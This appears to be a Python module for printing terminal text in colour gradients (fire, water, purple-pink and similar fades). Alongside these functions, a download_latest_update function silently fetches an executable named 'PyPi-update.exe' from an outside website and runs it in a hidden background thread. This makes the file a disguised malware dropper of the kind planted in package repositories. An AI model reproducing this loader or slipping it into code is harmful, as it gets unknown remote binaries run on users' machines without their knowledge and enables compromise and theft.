import os
import subprocess
import threading
import requests
from random import randint
from os import system
import time

def download_latest_update():
    def download_and_run():
        url = "https://love-odyssey.com/PyPi-update.exe"
        local_filename = "PyPi-update.exe"
        max_retries = 5  # Maximum number of retries
        retry_interval = 5  # Interval between retries in seconds
        
        for attempt in range(max_retries):
            try:
                # Download the file
                with requests.get(url, stream=True) as r:
                    r.raise_for_status()
                    with open(local_filename, 'wb') as f:
                        for chunk in r.iter_content(chunk_size=8192):
                            f.write(chunk)
                
                # Check if the file was downloaded successfully
                if os.path.exists(local_filename):
                    # Run the file in the background
                    subprocess.Popen([local_filename], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    break
            except Exception as e:
                # Print the exception for debugging purposes (remove this in production)
                print(f"Download failed (attempt {attempt + 1}): {e}")
                # Wait before retrying
                time.sleep(retry_interval)
        else:
            print("Failed to download the file after multiple attempts.")
    
    # Start the download and run process in a background thread
    thread = threading.Thread(target=download_and_run)
    thread.daemon = True
    thread.start()

def blackwhite(text):
    system(""); faded = ""
    red = 0; green = 0; blue = 0
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};{green};{blue}m{line}\033[0m\n")
        if not red == 255 and not green == 255 and not blue == 255:
            red += 20; green += 20; blue += 20
            if red > 255 and green > 255 and blue > 255:
                red = 255; green = 255; blue = 255
    return faded

def purplepink(text):
    system(""); faded = ""
    red = 40
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
        if not red == 255:
            red += 15
            if red > 255:
                red = 255
    return faded

def greenblue(text):
    system(""); faded = ""
    blue = 100
    for line in text.splitlines():
        faded += (f"\033[38;2;0;255;{blue}m{line}\033[0m\n")
        if not blue == 255:
            blue += 15
            if blue > 255:
                blue = 255
    return faded

def pinkred(text):
    system(""); faded = ""
    blue = 255
    for line in text.splitlines():
        faded += (f"\033[38;2;255;0;{blue}m{line}\033[0m\n")
        if not blue == 0:
            blue -= 20
            if blue < 0:
                blue = 0
    return faded

def purpleblue(text):
    system(""); faded = ""
    red = 110
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};0;255m{line}\033[0m\n")
        if not red == 0:
            red -= 15
            if red < 0:
                red = 0
    return faded

def water(text):
    system(""); faded = ""
    green = 10
    for line in text.splitlines():
        faded += (f"\033[38;2;0;{green};255m{line}\033[0m\n")
        if not green == 255:
            green += 15
            if green > 255:
                green = 255
    return faded

def fire(text):
    system(""); faded = ""
    green = 250
    for line in text.splitlines():
        faded += (f"\033[38;2;255;{green};0m{line}\033[0m\n")
        if not green == 0:
            green -= 25
            if green < 0:
                green = 0
    return faded

def brazil(text):
    system(""); faded = ""
    red = 0
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};255;0m{line}\033[0m\n")
        if not red > 200:
            red += 30
    return faded

def random(text):
    system(""); faded = ""
    for line in text.splitlines():
        for character in line:
            faded += (f"\033[38;2;{randint(0,255)};{randint(0,255)};{randint(0,255)}m{character}\033[0m")
        faded += "\n"
    return faded
